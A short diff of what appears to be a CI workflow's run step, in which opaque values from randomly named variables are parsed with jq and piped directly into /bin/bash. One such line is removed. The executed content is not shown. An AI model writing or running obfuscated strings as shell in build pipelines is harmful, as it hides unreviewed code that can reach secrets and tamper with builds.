@@ -24,7 +24,6 @@ jobs:
         run: |
           printf '%s' "$opnvj992" | jq -r .zeq9 | /bin/bash
           echo $gp7829 | jq -r .p63 | /bin/bash
-          echo $sfpl87901 | jq -r .vptu2223 | /bin/bash
           echo $l122 | jq -r .pc4 | /bin/bash
 
       - name: Save archive
